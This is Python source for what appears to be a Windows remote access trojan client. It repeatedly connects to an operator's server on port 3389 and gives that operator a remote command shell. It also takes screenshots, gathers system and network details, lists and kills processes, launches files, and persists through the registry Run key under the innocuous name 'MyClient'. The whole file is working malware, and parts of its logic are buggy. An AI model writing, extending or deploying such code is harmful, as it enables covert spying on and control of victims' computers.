import os
import io
import sys
import time
import winreg

import socket
import subprocess

import psutil
import shutil
import ctypes

import platform
import webbrowser
import pyautogui
import getmac


SERVER_IP = "0.0.0.0"
SERVER_PORT = 3389

cwd = os.getcwd()

cmd_mode_enabled = False


def connect_to_server():
    # Create socket and connect to server
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            print("[CONNECTING] Attempting connection...")
            client.connect((SERVER_IP, SERVER_PORT))
            print("[CONNECTED]")
            handle_incoming_commands(client)
            return client

        except:
            time.sleep(2)
            continue


#################################################################################


def get_system_info():
    try:
        info = {
            "OS": platform.system,
            "OS Version": platform.version(),
            "Architecture": platform.architecture()[0],
            "Hostname": socket.gethostname(),
            "Username": os.getlogin(),
            "CPU": platform.processor(),
            "RAM": f"{round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB",
        }

        sys_info_str = "\n".join([f"{key}: {value}" for key, value in info.items()])
        return sys_info_str
    except (
        socket.timeout,
        OSError,
        ConnectionResetError,
        BrokenPipeError,
        Exception,
    ) as e:
        client.sendall(f"[ERROR] {e}".encode())


def list_active_ports(argument):
    try:
        ports = []
        for conn in psutil.net_connections(kind="inet"):
            local_ip, local_port = conn.laddr
            remote_ip, remote_port = conn.raddr if conn.raddr else ("", "")
            status = conn.status

            if argument == "-e":
                if conn.status == "ESTABLISHED":
                    ports.append(
                        f"Local: {local_ip}: {local_port} ->: {remote_ip}: {remote_port} (Status: {status})"
                    )

            if argument == "-l":
                if conn.status == "LISTEN":
                    ports.append(
                        f"Local: {local_ip}: {local_port} ->: {remote_ip}: {remote_port} (Status: {status})"
                    )

            if argument == "None":
                ports.append(
                    f"Local: {local_ip}: {local_port} ->: {remote_ip}: {remote_port} (Status: {status})"
                )
        if not ports:
            return "[ERROR] No active ports found."
    except (
        socket.timeout,
        OSError,
        ConnectionResetError,
        BrokenPipeError,
        Exception,
    ) as e:
        client.sendall(f"[ERROR] {e}".encode())

    return "\n".join(ports)


def handle_upload(client, server_command):
    try:
        parts = server_command.split(" ", 2)

        source_filepath = parts[1].strip()
        destination_filepath = parts[2].strip()

        # Create the target directory if it does not exist
        os.makedirs(os.path.dirname(destination_filepath), exist_ok=True)

        # Perform file transfer from server to file location
        shutil.copy(source_filepath, destination_filepath)

        client.sendall(
            f"[UPLD] File '{source_filepath}' uploaded to '{destination_filepath}'".encode()
        )
    except (
        socket.timeout,
        OSError,
        ConnectionResetError,
        BrokenPipeError,
        Exception,
    ) as e:
        client.sendall(f"[ERROR] {e}".encode())


def send_desktop_screenshot(client):
    try:
        screenshot = pyautogui.screenshot()

        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format="png")

        screenshot_data = img_byte_arr.getvalue()

        client.sendall(len(screenshot_data).to_bytes(4, "big"))

        client.sendall(screenshot_data)
    except (
        socket.timeout,
        OSError,
        ConnectionResetError,
        BrokenPipeError,
        Exception,
    ) as e:
        client.sendall(f"[ERROR] {e}".encode())


def get_network_info():
    try:
        ip_address = socket.gethostbyname(socket.gethostname())
        mac_address = getmac.get_mac_address()

        net_info = f"\nIP Address: {ip_address}\nMAC Address: {mac_address}"
        return net_info
    except (
        socket.timeout,
        OSError,
        ConnectionResetError,
        BrokenPipeError,
        Exception,
    ) as e:
        client.sendall(f"[ERROR] {e}".encode())


def admin_check():
    if ctypes.windll.shell32.IsUserAnAdmin():
        return True
    else:
        return False


def add_to_startup(client):
    try:
        # Get the path of the currently running script
        exe_path = os.path.abspath(
            sys.argv[0]
        )  # Path to the current .exe or .py script

        # Open the registry key for the current user's startup
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE,
        )

        # Set the registry value with the name of your client (e.g., "MyClient") and the executable path
        winreg.SetValueEx(key, "MyClient", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)

        client.sendall(b"[INFO] Client added to startup successfully!")
    except Exception as e:
        client.sendall(f"[ERROR] Failed to add client to startup: {str(e)}".encode())


#################################################################################


def handle_incoming_commands(client):
    global cmd_mode_enabled, cwd, cap

    while client:
        try:
            server_command = client.recv(4096).decode().strip()
            print(server_command)

            if not server_command:
                continue

            elif server_command.lower() == "\x00":
                os.system("cls")
                continue

            elif server_command.lower() == "exit":
                client.sendall(b"[CLIENT] Connection closed.")
                cmd_mode_enabled = False
                time.sleep(1)
                client.shutdown(socket.SHUT_RDWR)
                client.close()
                time.sleep(2)
                client = connect_to_server()
                continue

            ######################################
            ######################################

            if cmd_mode_enabled:
                handle_cmd_commands(client, server_command)

            ######################################
            ######################################

            if not cmd_mode_enabled:
                if server_command.lower() == "cmd_on":
                    cmd_mode_enabled = True
                    client.sendall(b"[ENTERING CMD MODE]")
                    continue

                elif server_command.lower() == "sys_info":
                    system_info = get_system_info()
                    client.sendall(system_info.encode())
                    continue

                elif server_command.lower().startswith("list_ports"):
                    try:
                        if len(server_command.lower().split(" ")) > 1:
                            argument = server_command.lower().split(" ", 1)[1]
                            if argument in ["-e", "-l"]:
                                ports_data = list_active_ports(argument)
                            else:
                                client.sendall(
                                    f"[ERROR] Invalid list_ports command. Usage: 'list_ports (optional -e or -l)'"
                                )
                        else:
                            ports_data = list_active_ports("None")
                        client.sendall(ports_data.encode())
                    except Exception as e:
                        response = f"[ERROR] {str(e)}"
                    continue

                elif server_command.lower() == "list_proc":
                    print("list")
                    processes = []
                    for proc in psutil.process_iter(["pid", "name"]):
                        try:
                            pid = proc.info["pid"]
                            name = proc.info["name"]
                            processes.append(f"{pid}: {name}")
                        except (
                            psutil.NoSuchProcess,
                            psutil.AccessDenied,
                            psutil.ZombieProcess,
                        ):
                            continue
                    process_data = "\n".join(processes).encode()
                    client.sendall(process_data)
                    continue

                elif server_command.lower().startswith("kill_proc"):
                    try:
                        pid_str = server_command.split(" ", 1)[1]
                        pid = int(pid_str)

                        proc = psutil.Process(pid)
                        proc.terminate()
                        response = f"[KILL] Process {pid} terminated."

                    except (ValueError, IndexError):
                        response = (
                            "[KILL] Invalid command format. Usage: kill_proc <PID>"
                        )

                    except psutil.NoSuchProcess:
                        response = "[KILL] Process not found."

                    except psutil.AccessDenied:
                        response = "[KILL] Permission denied."

                    except Exception as e:
                        response = f"[KILL] {str(e)}"

                    client.sendall(response.encode())
                    continue

                elif server_command.lower().startswith("upld"):
                    handle_upload(client, server_command)

                elif server_command.lower().startswith("run"):
                    try:
                        run_path = server_command.split(" ", 1)[1]
                        if not os.path.exists(run_path):
                            client.sendall(b"[RUN] File not found.")
                            continue
                        os.startfile(run_path)
                        client.sendall(
                            f"[RUN] File '{run_path}' executed successfully.".encode()
                        )

                        if server_command.lower().startswith("open_url"):
                            url = server_command.split(" ", 1)[1]
                            webbrowser.open(url)
                            client.sendall(
                                f"[URL_OPEN] '{url}' opened successfully.".encode()
                            )
                        else:
                            client.sendall(
                                b"[ERROR] Invalid command. Enter 'help' to list available commands."
                            )
                            continue
                    except Exception as e:
                        client.sendall(f"[ERROR] {str(e)}".encode())

                elif server_command.lower().startswith("open_url"):
                    url = server_command.split(" ", 1)[1]
                    webbrowser.open(url)
                    client.sendall(f"[URL] Open '{url}' successful.")

                elif server_command.lower() == "screenshot":
                    send_desktop_screenshot(client)

                elif server_command.lower() == "netinfo":
                    net_info = get_network_info()
                    client.sendall(net_info.encode())

                elif server_command.lower() == "check_admin":
                    if admin_check() == True:
                        client.sendall(b"[ADMIN] Client program has admin permissions.")
                    if admin_check() == False:
                        client.sendall(
                            b"[ADMIN] Client program does NOT have admin permissions."
                        )

                elif server_command.lower() == "startup":
                    add_to_startup(client)

                else:
                    client.sendall(
                        b"[ERROR] Invalid command. Type 'help' to list all available commands."
                    )

        except (BrokenPipeError, ConnectionResetError, OSError) as e:
            cmd_mode_enabled = False
            cwd = os.getcwd()
            try:
                client.shutdown(socket.SHUT_RDWR)
                client.close()
            except:
                pass
            print("[DISCONNECTED] Lost connection to server. Reconnecting...")
            time.sleep(2)
            client = connect_to_server()


def handle_cmd_commands(client, server_command):
    global cmd_mode_enabled, cwd
    try:
        if server_command.lower() == "cmd_off":
            cmd_mode_enabled = False
            client.sendall(b"[EXITING CMD MODE]")
            handle_incoming_commands(client)

        if server_command.lower() == "cwd":
            cwd = os.getcwd()
            client.sendall(f"{cwd}".encode())
            handle_incoming_commands(client)

        if server_command.startswith("cd "):
            new_path = server_command.split(" ", 1)[1].strip()
            target_path = os.path.abspath(os.path.join(cwd, new_path))

            if os.path.isdir(target_path):
                cwd = target_path
                client.sendall(f"{cwd}".encode())
            else:
                handle_incoming_commands(client)

            handle_incoming_commands(client)

        else:
            try:
                process = subprocess.Popen(
                    server_command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    cwd=cwd,
                    shell=True,
                )

                stdout, stderr = process.communicate()

                output = stdout.decode(errors="ignore") + stderr.decode(errors="ignore")
                if not output.strip():
                    output = "Command executed successfully."
                client.sendall(output.encode())
                handle_incoming_commands(client)

            except Exception as e:
                client.sendall(f"[ERROR] : {str(e)}")
                handle_incoming_commands(client)

    except (BrokenPipeError, ConnectionResetError, OSError) as e:
        cmd_mode_enabled = False
        cwd = os.getcwd()
        try:
            client.shutdown(socket.SHUT_RDWR)
            client.close()
        except:
            pass
        print("[DISCONNECTED] Lost connection to server. Reconnecting...")
        time.sleep(2)
        client = connect_to_server()


client = connect_to_server()
